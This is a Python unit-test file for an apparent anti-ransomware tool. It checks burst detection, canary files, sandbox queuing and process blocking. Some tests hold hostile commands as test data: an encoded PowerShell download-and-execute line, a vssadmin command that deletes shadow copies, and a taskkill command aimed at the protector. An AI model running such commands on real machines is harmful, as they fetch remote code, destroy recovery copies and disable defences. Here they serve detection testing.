from __future__ import annotations

import base64
import os
import sys
import tempfile
import time
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import patch

os.environ["RAGNAR_APP_DIR"] = tempfile.mkdtemp(prefix="ragnar-protect-tests-")

from ragnar_protect.behavior_engine import BehaviorCorrelationEngine
from ragnar_protect.canary_guard import CanaryGuard
from ragnar_protect.cloud_reputation import CloudReputationClient
from ragnar_protect.config import is_managed_path
from ragnar_protect.database import Database
from ragnar_protect.hidden_process import _apply_hidden_windows_kwargs
from ragnar_protect.blocker import ProcessBlocker
from ragnar_protect.models import (
    FileScanResult,
    IsolatedExecutionReport,
    LaunchDecision,
    SandboxExecutionReport,
    ScanFinding,
    StageVerdict,
    WatchedFileState,
)
from ragnar_protect.process_guard import ProcessGuard
from ragnar_protect.sandbox_queue import SandboxQueue
from ragnar_protect.staged_analysis import StagePipeline
from ragnar_protect.watch_manager import WatchManager


class _FakeScanner:
    def __init__(self) -> None:
        self.restored_items: list[int] = []

    def scan_file(self, path: Path) -> FileScanResult:
        return FileScanResult(
            path=str(path),
            sha256="feedface",
            size=path.stat().st_size if path.exists() else 0,
            extension=path.suffix.lower(),
            status="malicious",
            score=90,
            findings=[],
            metadata={},
        )

    def file_sha256(self, path: Path | str) -> str:
        return "feedface"

    def restore_quarantine_item(self, item_id: int) -> str:
        self.restored_items.append(item_id)
        return f"C:\\restored\\item_{item_id}.exe"

    def count_strong_confirmations(self, result: FileScanResult) -> int:
        return 1 if result.status == "malicious" else 0

    def enforce_block_on_existing_file(self, file_path: Path | str, result: FileScanResult) -> dict[str, object]:
        return {"blocked": True, "quarantined_path": "", "quarantine_item_id": None}

    def record_external_result(self, result: FileScanResult, persist_clean: bool = False) -> None:
        return None


class _FakeProcessGuardScanner:
    def __init__(self) -> None:
        self.calls: list[str] = []

    def scan_artifact(self, display_path: str, content: str, extension: str, metadata: dict, persist: bool, persist_clean: bool):
        self.calls.append(display_path)
        if display_path.startswith("process-payload://"):
            return FileScanResult(
                path=display_path,
                sha256="payload",
                size=len(content),
                extension=extension,
                status="suspicious",
                score=55,
                findings=[
                    ScanFinding(
                        kind="download_and_exec",
                        title="Download and execute chain",
                        score=45,
                        description="Suspicious PowerShell payload",
                    )
                ],
                metadata=metadata,
            )
        return FileScanResult(
            path=display_path,
            sha256="proc",
            size=len(content),
            extension=extension,
            status="clean",
            score=0,
            findings=[],
            metadata=metadata,
        )

    def count_strong_confirmations(self, result: FileScanResult) -> int:
        return 0


class _FakeRansomToolScanner:
    def scan_artifact(self, display_path: str, content: str, extension: str, metadata: dict, persist: bool, persist_clean: bool):
        return FileScanResult(
            path=display_path,
            sha256="tool",
            size=len(content),
            extension=extension,
            status="malicious",
            score=95,
            findings=[
                ScanFinding(
                    kind="shadow_copy_delete",
                    title="Shadow copy deletion or tampering",
                    score=55,
                    description="vssadmin or wmic shadowcopy deletion detected",
                )
            ],
            metadata=metadata,
        )

    def count_strong_confirmations(self, result: FileScanResult) -> int:
        return 0


class _FakeLaunchScanner:
    def __init__(self, result: FileScanResult) -> None:
        self.result = result
        self.calls: list[str] = []

    def scan_file(self, path: Path, persist: bool = True) -> FileScanResult:
        self.calls.append(str(path))
        return self.result

    def scan_artifact(self, display_path: str, content: str, extension: str, metadata: dict, persist: bool, persist_clean: bool):
        return FileScanResult(
            path=display_path,
            sha256="artifact",
            size=len(content),
            extension=extension,
            status="clean",
            score=0,
            findings=[],
            metadata=metadata,
        )

    def count_strong_confirmations(self, result: FileScanResult) -> int:
        return 0

    def is_low_signal_packed_pe_result(self, result: FileScanResult) -> bool:
        return True

    def enforce_block_on_existing_file(self, file_path: Path | str, result: FileScanResult) -> dict[str, object]:
        return {"blocked": True, "quarantined_path": "", "quarantine_item_id": None}

    def record_external_result(self, result: FileScanResult, persist_clean: bool = False) -> None:
        return None


class _FakeProc:
    def __init__(self, pid: int, cmdline: list[str]) -> None:
        self.pid = pid
        self.info = {
            "pid": pid,
            "name": "powershell.exe",
            "exe": "",
            "cmdline": [],
            "create_time": time.time(),
        }
        self._cmdline = cmdline

    def name(self) -> str:
        return "powershell.exe"

    def exe(self) -> str:
        return r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

    def cmdline(self) -> list[str]:
        return list(self._cmdline)


class _FakeSystemToolProc(_FakeProc):
    def __init__(self, pid: int, exe_path: str, name: str, cmdline: list[str]) -> None:
        super().__init__(pid, cmdline)
        self.info["name"] = name
        self.info["exe"] = exe_path

    def name(self) -> str:
        return str(self.info["name"])

    def exe(self) -> str:
        return str(self.info["exe"])


class _FakeLaunchProc:
    def __init__(self, exe_path: str) -> None:
        self.pid = 5454
        self.info = {
            "pid": self.pid,
            "name": Path(exe_path).name,
            "exe": exe_path,
            "cmdline": [exe_path],
            "create_time": time.time(),
        }
        self.suspended = False
        self.resumed = False

    def suspend(self) -> None:
        self.suspended = True

    def resume(self) -> None:
        self.resumed = True


class _FakeProcWithoutInfo:
    def __init__(self, pid: int, exe_path: str, cmdline: list[str]) -> None:
        self.pid = pid
        self._exe = exe_path
        self._cmdline = list(cmdline)
        self._name = Path(exe_path).name
        self._create_time = time.time()

    def name(self) -> str:
        return self._name

    def exe(self) -> str:
        return self._exe

    def cmdline(self) -> list[str]:
        return list(self._cmdline)

    def create_time(self) -> float:
        return self._create_time


class _FakeCanaryGuard:
    def __init__(self, canary_paths: list[str]) -> None:
        self._paths = {str(Path(value)).lower() for value in canary_paths}

    def is_canary_path(self, value: str | Path) -> bool:
        return str(Path(value)).lower() in self._paths


class _FakeRollbackCache:
    def __init__(self) -> None:
        self.snapshots: list[str] = []

    def should_protect(self, path: Path) -> bool:
        return path.suffix.lower() in {".txt", ".docx", ".xlsx", ".pdf"}

    def snapshot_file(self, path: Path, reason: str = "background") -> str | None:
        if not path.exists():
            return None
        self.snapshots.append(f"{path}|{reason}")
        return f"C:\\rollback\\{path.name}.bak"


class RagnarV2Tests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db = Database(Path(self.temp_dir.name) / "test.db")
        self.fake_scanner = _FakeScanner()

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_behavior_identified_rename_burst_stays_stage1_without_ransomware_chain(self) -> None:
        engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
        target_dir = Path(self.temp_dir.name) / "Desktop"
        target_dir.mkdir()
        with patch.object(engine, "_attribute_process", return_value={"pid": 4242, "name": "evil.exe", "exe": str(target_dir / "evil.exe"), "confidence": 80, "recent": True, "child_count": 1, "write_rate": 2_000_000.0}), patch.object(engine, "_kill_and_contain") as kill_mock:
            for index in range(25):
                engine._process_event(
                    {
                        "event_type": "moved",
                        "path": str(target_dir / f"doc{index}.txt"),
                        "dest_path": str(target_dir / f"doc{index}.locked"),
                        "timestamp": time.time(),
                        "is_directory": False,
                    }
                )
        incidents = self.db.list_recent_behavior_events(limit=5)
        self.assertTrue(incidents)
        self.assertEqual(incidents[0]["stage"], "stage1")
        self.assertIn(incidents[0]["incident_type"], {"rename_burst", "encrypted_rename_burst"})
        kill_mock.assert_not_called()

    def test_behavior_unattributed_burst_stays_non_destructive(self) -> None:
        engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
        target_dir = Path(self.temp_dir.name) / "Documents"
        target_dir.mkdir()
        with patch.object(engine, "_attribute_process", return_value=None), patch.object(engine, "_kill_and_contain") as kill_mock:
            for index in range(25):
                engine._process_event(
                    {
                        "event_type": "moved",
                        "path": str(target_dir / f"doc{index}.txt"),
                        "dest_path": str(target_dir / f"doc{index}.locked"),
                        "timestamp": time.time(),
                        "is_directory": False,
                    }
                )
        incidents = self.db.list_recent_behavior_events(limit=5)
        self.assertTrue(incidents)
        self.assertEqual(incidents[0]["stage"], "stage1")
        self.assertEqual(incidents[0]["incident_type"], "burst_unattributed")
        kill_mock.assert_not_called()

    def test_behavior_ransom_note_and_encrypted_rename_escalates_with_killable_fallback(self) -> None:
        engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
        target_dir = Path(self.temp_dir.name) / "Documents"
        target_dir.mkdir()
        with patch.object(
            engine,
            "_attribute_process",
            return_value={
                "pid": 5151,
                "name": "locker.exe",
                "exe": str(target_dir / "locker.exe"),
                "confidence": 25,
                "recent": True,
                "user_space": True,
                "child_count": 0,
                "write_rate": 900_000.0,
            },
        ), patch.object(engine, "_kill_and_contain") as kill_mock:
            for index in range(12):
                engine._process_event(
                    {
                        "event_type": "moved",
                        "path": str(target_dir / f"doc{index}.docx"),
                        "dest_path": str(target_dir / f"doc{index}.lockbit"),
                        "timestamp": time.time(),
                        "is_directory": False,
                    }
                )
            engine._process_event(
                {
                    "event_type": "created",
                    "path": str(target_dir / "HOW_TO_DECRYPT.txt"),
                    "dest_path": None,
                    "timestamp": time.time(),
                    "is_directory": False,
                }
            )
        incidents = self.db.list_recent_behavior_events(limit=5)
        self.assertTrue(incidents)
        self.assertEqual(incidents[0]["stage"], "stage2")
        self.assertIn(incidents[0]["incident_type"], {"ransom_note_burst", "encrypted_rename_burst"})
        kill_mock.assert_called()

    def test_behavior_canary_trip_escalates_stage2(self) -> None:
        target_dir = Path(self.temp_dir.name) / "Documents"
        target_dir.mkdir()
        canary_path = target_dir / "RAGNAR_GUARD_DO_NOT_TOUCH.txt"
        canary_path.write_text("guard", encoding="utf-8")
        engine = BehaviorCorrelationEngine(
            self.fake_scanner,
            self.db,
            watch_manager=None,
            canary_guard=_FakeCanaryGuard([str(canary_path)]),
        )
        with patch.object(
            engine,
            "_attribute_process",
            return_value={
                "pid": 9898,
                "name": "locker.exe",
                "exe": str(target_dir / "locker.exe"),
                "confidence": 30,
                "recent": True,
                "user_space": True,
                "child_count": 0,
                "write_rate": 250_000.0,
            },
        ), patch.object(engine, "_kill_and_contain") as kill_mock:
            engine._process_event(
                {
                    "event_type": "modified",
                    "path": str(canary_path),
                    "dest_path": None,
                    "timestamp": time.time(),
                    "is_directory": False,
                }
            )
        incidents = self.db.list_recent_behavior_events(limit=5)
        self.assertTrue(incidents)
        self.assertEqual(incidents[0]["incident_type"], "canary_trip")
        self.assertEqual(incidents[0]["stage"], "stage2")
        kill_mock.assert_called()

    def test_behavior_delete_burst_escalates_stage2(self) -> None:
        engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
        target_dir = Path(self.temp_dir.name) / "Documents"
        target_dir.mkdir()
        with patch.object(
            engine,
            "_attribute_process",
            return_value={
                "pid": 9090,
                "name": "wiper.exe",
                "exe": str(target_dir / "wiper.exe"),
                "confidence": 35,
                "recent": True,
                "user_space": True,
                "child_count": 0,
                "write_rate": 500_000.0,
            },
        ), patch.object(engine, "_kill_and_contain") as kill_mock:
            for index in range(12):
                engine._process_event(
                    {
                        "event_type": "deleted",
                        "path": str(target_dir / f"doc{index}.docx"),
                        "dest_path": None,
                        "timestamp": time.time(),
                        "is_directory": False,
                    }
                )
        incidents = self.db.list_recent_behavior_events(limit=5)
        self.assertTrue(incidents)
        self.assertEqual(incidents[0]["stage"], "stage2")
        self.assertIn(incidents[0]["incident_type"], {"delete_burst", "data_delete_burst"})
        kill_mock.assert_called()

    def test_behavior_preemptive_snapshot_captures_untouched_files(self) -> None:
        target_dir = Path(self.temp_dir.name) / "Documents"
        target_dir.mkdir()
        for name in ("safe1.docx", "safe2.xlsx", "safe3.txt"):
            (target_dir / name).write_text("payload", encoding="utf-8")
        rollback = _FakeRollbackCache()
        engine = BehaviorCorrelationEngine(
            self.fake_scanner,
            self.db,
            watch_manager=None,
            rollback_cache=rollback,
        )
        with patch.object(engine, "_attribute_process", return_value=None):
            for index in range(4):
                engine._process_event(
                    {
                        "event_type": "moved",
                        "path": str(target_dir / f"doc{index}.docx"),
                        "dest_path": str(target_dir / f"doc{index}.lockbit"),
                        "timestamp": time.time(),
                        "is_directory": False,
                    }
                )
        self.assertGreaterEqual(len(rollback.snapshots), 1)

    def test_watch_manager_auto_unblock_after_three_clean_rescans(self) -> None:
        watch_manager = WatchManager(self.db, self.fake_scanner, interval_seconds=1)
        old_date = (datetime.now(timezone.utc) - timedelta(days=91)).isoformat(timespec="seconds")
        self.db.upsert_watched_file(
            WatchedFileState(
                path="C:\\Users\\Test\\Downloads\\sample.exe",
                sha256="deadbeef",
                status="under_watch",
                reason="packed executable",
                last_verdict="suspicious",
                clean_scan_count=3,
                cloud_verdict="unknown",
                sandbox_verdict="clean",
                local_verdict="suspicious",
                defender_verdict="unknown",
                last_seen_at=old_date,
                under_watch_since=old_date,
                last_clean_at=old_date,
                metadata={},
            )
        )
        self.db.upsert_blocked_file("C:\\Users\\Test\\Downloads\\sample.exe", "deadbeef", "test", source="unit")
        watch_manager._evaluate_auto_unblock()
        watched = self.db.get_watched_file("C:\\Users\\Test\\Downloads\\sample.exe", "deadbeef")
        self.assertIsNotNone(watched)
        self.assertEqual(watched["status"], "auto_unblocked")
        self.assertFalse(self.db.is_hash_blocked("deadbeef"))
        self.assertGreaterEqual(self.db.count_pending_reputation_events(), 1)

    def test_watch_manager_purges_managed_mei_entries(self) -> None:
        watch_manager = WatchManager(self.db, self.fake_scanner, interval_seconds=1)
        bundle_root = Path(self.temp_dir.name) / "_MEI77777"
        (bundle_root / "native_helper").mkdir(parents=True)
        managed_path = bundle_root / "python3.dll"
        managed_path.write_text("placeholder", encoding="utf-8")
        self.db.upsert_watched_file(
            WatchedFileState(
                path=str(managed_path),
                sha256="managedhash",
                status="under_watch",
                reason="should be ignored",
                last_verdict="suspicious",
                metadata={},
            )
        )

        watch_manager._purge_managed_watch_entries()

        self.assertIsNone(self.db.get_watched_file(str(managed_path), "managedhash"))

    def test_is_managed_path_detects_mei_runtime_dlls(self) -> None:
        bundle_root = Path(self.temp_dir.name) / "_MEI88991"
        bundle_root.mkdir(parents=True)
        runtime_dll = bundle_root / "python3.dll"
        runtime_api_dll = bundle_root / "api-ms-win-crt-stdio-l1-1-0.dll"
        runtime_dll.write_text("runtime", encoding="utf-8")
        runtime_api_dll.write_text("runtime", encoding="utf-8")
        self.assertTrue(is_managed_path(runtime_dll))
        self.assertTrue(is_managed_path(runtime_api_dll))

    def test_blocker_ignores_managed_runtime_paths(self) -> None:
        bundle_root = Path(self.temp_dir.name) / "_MEI99887"
        bundle_root.mkdir(parents=True)
        managed_exe = bundle_root / "RagnarProtect.exe"
        managed_exe.write_text("runtime", encoding="utf-8")
        self.db.upsert_blocked_file(str(managed_exe), "managed-blocked-hash", "test", source="unit")
        blocker = ProcessBlocker(self.db)

        class _ManagedProc:
            def __init__(self, exe_path: Path) -> None:
                self.pid = 9191
                self.info = {
                    "pid": self.pid,
                    "name": "RagnarProtect.exe",
                    "exe": str(exe_path),
                }

        with patch("ragnar_protect.blocker.psutil.process_iter", return_value=[_ManagedProc(managed_exe)]), patch.object(
            blocker,
            "_terminate_process_tree",
        ) as terminate_mock:
            blocker._enforce_blocklist()

        terminate_mock.assert_not_called()
        self.assertFalse(self.db.is_hash_blocked("managed-blocked-hash"))

    def test_cloud_client_rejects_secret_key(self) -> None:
        client = CloudReputationClient(
            lookup_url="https://example.com/lookup",
            event_url="https://example.com/event",
            requalify_url="https://example.com/requalify",
            api_key="sb_secret_compromised",
        )
        self.assertTrue(client.misconfigured_secret)
        self.assertFalse(client.available)

    def test_sandbox_queue_enqueues_suspicious_packed_pe(self) -> None:
        sample = Path(self.temp_dir.name) / "packed.exe"
        sample.write_text("packed sample", encoding="utf-8")
        queue = SandboxQueue(self.db)
        result = FileScanResult(
            path=str(sample),
            sha256="abbaabba",
            size=sample.stat().st_size,
            extension=".exe",
            status="suspicious",
            score=55,
            findings=[
                ScanFinding(
                    kind="pe_upx_sections",
                    title="UPX sections",
                    score=30,
                    description="Packed executable indicators",
                )
            ],
            metadata={"authenticode": {"status": "NotSigned"}},
        )
        queue.consider_scan_result(result)
        queued = self.db.list_sandbox_queue(limit=10)
        self.assertEqual(len(queued), 1)
        self.assertEqual(queued[0]["status"], "pending")

    def test_sandbox_queue_requeues_running_items_after_restart(self) -> None:
        sample = Path(self.temp_dir.name) / "resume.exe"
        sample.write_text("resume sample", encoding="utf-8")
        item_id = self.db.enqueue_sandbox_sample(str(sample), "cafebabe", "resume me")
        claimed = self.db.claim_next_sandbox_item()
        self.assertIsNotNone(claimed)
        self.assertEqual(int(claimed["id"]), item_id)
        recovered = self.db.requeue_running_sandbox_items()
        self.assertEqual(recovered, 1)
        queued = self.db.list_sandbox_queue(limit=10)
        self.assertEqual(queued[0]["status"], "pending")

    def test_hidden_subprocess_kwargs_enable_no_window_mode(self) -> None:
        kwargs = _apply_hidden_windows_kwargs({})
        self.assertIn("creationflags", kwargs)
        self.assertNotEqual(int(kwargs["creationflags"]), 0)
        self.assertIn("startupinfo", kwargs)

    def test_launch_interceptor_holds_suspicious_new_executable_for_background_sandbox(self) -> None:
        sample = Path(self.temp_dir.name) / "packed.exe"
        sample.write_text("packed sample", encoding="utf-8")
        scan_result = FileScanResult(
            path=str(sample),
            sha256="holdme",
            size=sample.stat().st_size,
            extension=".exe",
            status="suspicious",
            score=55,
            findings=[
                ScanFinding(
                    kind="pe_upx_sections",
                    title="UPX sections",
                    score=30,
                    description="Packed executable indicators",
                )
            ],
            metadata={"authenticode": {"status": "NotSigned"}, "reputation": {"verdict": "unknown"}},
        )
        scanner = _FakeLaunchScanner(scan_result)
        guard = ProcessGuard(scanner, self.db)
        proc = _FakeLaunchProc(str(sample))
        decision = LaunchDecision(
            path=str(sample),
            sha256="holdme",
            action="observe",
            final_verdict="suspicious",
            aggregate_score=58,
            reason="packed executable",
            stage_verdicts=[StageVerdict(stage="stage3", verdict="suspicious", score=58, summary="aggregate")],
        )
        guard.stage_pipeline.native_helper = type("_HelperState", (), {"available": True})()

        with patch.object(guard, "_terminate_process_tree") as terminate_mock, patch.object(
            guard.stage_pipeline,
            "analyze_launch",
            return_value=(decision, scan_result),
        ):
            guard._inspect_process(proc, (proc.pid, proc.info["create_time"]), first_seen=True)

        queued = self.db.list_sandbox_queue(limit=10)
        self.assertEqual(len(queued), 1)
        self.assertEqual(queued[0]["sha256"], "holdme")
        self.assertEqual(queued[0]["status"], "pending")
        self.assertTrue(proc.suspended)
        self.assertTrue(proc.resumed)
        self.assertFalse(self.db.is_hash_blocked("holdme"))
        terminate_mock.assert_not_called()

    def test_sandbox_clean_report_releases_launch_interceptor_block(self) -> None:
        sample = Path(self.temp_dir.name) / "observe.exe"
        sample.write_text("observe sample", encoding="utf-8")
        self.db.upsert_blocked_file(str(sample), "observehash", "pending observation", source="launch_interceptor")
        self.db.upsert_watched_file(
            WatchedFileState(
                path=str(sample),
                sha256="observehash",
                status="under_watch",
                reason="pending observation",
                last_verdict="suspicious",
                local_verdict="suspicious",
                sandbox_verdict="unknown",
                metadata={},
            )
        )
        queue = SandboxQueue(self.db)
        report = SandboxExecutionReport(
            sample_path=str(sample),
            sha256="observehash",
            verdict="clean",
            available=True,
        )
        queue._apply_report(str(sample), "observehash", report)
        watched = self.db.get_watched_file(str(sample), "observehash")
        self.assertIsNotNone(watched)
        self.assertEqual(watched["sandbox_verdict"], "clean")
        self.assertFalse(self.db.is_hash_blocked("observehash"))

    def test_stage_pipeline_escalates_borderline_pe_with_ransomware_signal_to_quick_sandbox(self) -> None:
        sample = Path(self.temp_dir.name) / "borderline.exe"
        sample.write_text("borderline sample", encoding="utf-8")
        stage1 = FileScanResult(
            path=str(sample),
            sha256="borderlinehash",
            size=sample.stat().st_size,
            extension=".exe",
            status="clean",
            score=30,
            findings=[
                ScanFinding(
                    kind="shadow_copy_delete",
                    title="Shadow copy deletion or tampering",
                    score=30,
                    description="vssadmin or related destructive tooling string detected",
                )
            ],
            metadata={},
        )
        scanner = _FakeLaunchScanner(stage1)
        pipeline = StagePipeline(scanner, self.db)
        quick_report = IsolatedExecutionReport(
            sample_path=str(sample),
            mode="quick",
            verdict="malicious",
            duration_seconds=4,
            process_started=True,
            backend="native-helper",
            details={"childCount": 1, "destructiveToolSeen": True},
        )

        with patch.object(pipeline, "_run_isolated", return_value=quick_report) as isolated_mock:
            decision, result = pipeline.analyze_launch(sample)

        self.assertGreaterEqual(isolated_mock.call_count, 1)
        isolated_mock.assert_any_call(sample, "quick", 6)
        self.assertEqual(decision.action, "kill_quarantine")
        self.assertEqual(result.status, "malicious")

    def test_stage_pipeline_uses_progressive_response_for_single_unconfirmed_sandbox_hit(self) -> None:
        sample = Path(self.temp_dir.name) / "gray.exe"
        sample.write_text("gray sample", encoding="utf-8")
        stage1 = FileScanResult(
            path=str(sample),
            sha256="grayhash",
            size=sample.stat().st_size,
            extension=".exe",
            status="suspicious",
            score=42,
            findings=[
                ScanFinding(
                    kind="pe_upx_sections",
                    title="UPX sections",
                    score=30,
                    description="Packed executable indicators",
                )
            ],
            metadata={"authenticode": {"status": "NotSigned"}},
        )
        scanner = _FakeLaunchScanner(stage1)
        pipeline = StagePipeline(scanner, self.db)
        quick_report = IsolatedExecutionReport(
            sample_path=str(sample),
            mode="quick",
            verdict="malicious",
            duration_seconds=4,
            process_started=True,
            backend="native-helper",
            details={"childCount": 1, "droppedExecutableCount": 1, "destructiveToolSeen": False},
        )
        deep_report = IsolatedExecutionReport(
            sample_path=str(sample),
            mode="deep",
            verdict="clean",
            duration_seconds=10,
            process_started=True,
            backend="native-helper",
            details={},
        )

        with patch.object(pipeline, "_run_isolated", side_effect=[quick_report, deep_report]):
            decision, result = pipeline.analyze_launch(sample)

        self.assertEqual(decision.action, "observe")
        self.assertEqual(result.status, "suspicious")

    def test_stage_pipeline_allows_low_signal_packer_after_clean_quick_stage(self) -> None:
        sample = Path(self.temp_dir.name) / "packed-signed.exe"
        sample.write_text("packed sample", encoding="utf-8")
        stage1 = FileScanResult(
            path=str(sample),
            sha256="packedclean",
            size=sample.stat().st_size,
            extension=".exe",
            status="suspicious",
            score=52,
            findings=[
                ScanFinding("sensitive_extension", "Sensitive extension", 8, ""),
                ScanFinding("pe_high_entropy_section", "High entropy section", 16, ""),
                ScanFinding("pe_packer_heuristic", "Packed executable heuristic", 22, ""),
                ScanFinding("pe_overlay_stub", "Overlay plus tiny import table", 14, ""),
            ],
            metadata={"authenticode": {"status": "Valid"}, "reputation": {"verdict": "unknown"}},
        )
        scanner = _FakeLaunchScanner(stage1)
        pipeline = StagePipeline(scanner, self.db)
        quick_report = IsolatedExecutionReport(
            sample_path=str(sample),
            mode="quick",
            verdict="clean",
            duration_seconds=4,
            process_started=True,
            backend="native-helper",
            details={},
        )

        with patch.object(pipeline, "_run_isolated", return_value=quick_report):
            decision, result = pipeline.analyze_launch(sample)

        self.assertEqual(decision.action, "allow")
        self.assertEqual(result.status, "clean")

    def test_process_guard_falls_back_to_live_cmdline_for_encoded_powershell(self) -> None:
        payload = "# IEX (New-Object Net.WebClient).DownloadString('http://example')\nStart-Sleep -Seconds 15"
        encoded = payload.encode("utf-16-le")
        scanner = _FakeProcessGuardScanner()
        guard = ProcessGuard(scanner, self.db)
        proc = _FakeProc(
            9999,
            [
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "-NoProfile",
                "-EncodedCommand",
                base64.b64encode(encoded).decode("ascii"),
            ],
        )
        with patch.object(guard, "_scan_live_executable", return_value=None), patch.object(guard, "_block_process_tree") as block_mock:
            guard._inspect_process(proc, (proc.pid, proc.info["create_time"]), first_seen=False)
        self.assertTrue(any(item.startswith("process-payload://") for item in scanner.calls))
        block_mock.assert_called_once()

    def test_process_guard_blocks_shadow_copy_deletion_tooling(self) -> None:
        scanner = _FakeRansomToolScanner()
        guard = ProcessGuard(scanner, self.db)
        proc = _FakeSystemToolProc(
            7777,
            r"C:\Windows\System32\cmd.exe",
            "cmd.exe",
            [
                r"C:\Windows\System32\cmd.exe",
                "/c",
                "vssadmin",
                "delete",
                "shadows",
                "/all",
                "/quiet",
            ],
        )
        with patch.object(guard, "_scan_live_executable", return_value=None), patch.object(guard, "_block_process_tree") as block_mock:
            guard._inspect_process(proc, (proc.pid, proc.info["create_time"]), first_seen=False)
        block_mock.assert_called_once()

    def test_process_guard_blocks_ragnar_tamper_command(self) -> None:
        scanner = _FakeRansomToolScanner()
        guard = ProcessGuard(scanner, self.db)
        proc = _FakeSystemToolProc(
            7878,
            r"C:\Windows\System32\taskkill.exe",
            "taskkill.exe",
            [
                r"C:\Windows\System32\taskkill.exe",
                "/F",
                "/IM",
                "RagnarProtect.exe",
            ],
        )
        with patch.object(guard, "_block_process_tree") as block_mock:
            guard._inspect_process(proc, (proc.pid, proc.info["create_time"]), first_seen=False)
        block_mock.assert_called_once()

    def test_process_guard_resumes_suspended_managed_process_when_preflight_is_skipped(self) -> None:
        scanner = _FakeLaunchScanner(
            FileScanResult(
                path=sys.executable,
                sha256="self",
                size=0,
                extension=Path(sys.executable).suffix.lower(),
                status="clean",
                score=0,
                findings=[],
                metadata={},
            )
        )
        guard = ProcessGuard(scanner, self.db)
        proc = _FakeLaunchProc(sys.executable)

        action = guard._process_launch_gate(proc, (proc.pid, proc.info["create_time"]), sys.executable, already_suspended=True)

        self.assertEqual(action, "allow")
        self.assertTrue(proc.resumed)

    def test_process_guard_inspect_loop_handles_process_without_info_attribute(self) -> None:
        scanner = _FakeLaunchScanner(
            FileScanResult(
                path="C:\\Users\\Test\\Downloads\\tool.exe",
                sha256="toolhash",
                size=0,
                extension=".exe",
                status="clean",
                score=0,
                findings=[],
                metadata={},
            )
        )
        guard = ProcessGuard(scanner, self.db)
        fake_proc = _FakeProcWithoutInfo(
            8181,
            "C:\\Users\\Test\\Downloads\\tool.exe",
            ["C:\\Users\\Test\\Downloads\\tool.exe"],
        )
        with patch("ragnar_protect.process_guard.psutil.process_iter", return_value=[fake_proc]), patch.object(
            guard,
            "_inspect_process",
        ) as inspect_mock:
            guard._inspect_processes()
        inspect_mock.assert_called_once()

    def test_canary_guard_seeds_first_level_subdirectories(self) -> None:
        root = Path(self.temp_dir.name) / "Documents"
        subdir = root / "Projects"
        subdir.mkdir(parents=True)
        guard = CanaryGuard(paths=[root])

        created = guard.ensure_canaries()

        self.assertTrue(any(str(subdir).lower() in str(path).lower() for path in created))
        self.assertTrue(any(guard.is_canary_path(path) for path in created))


if __name__ == "__main__":
    unittest.main()
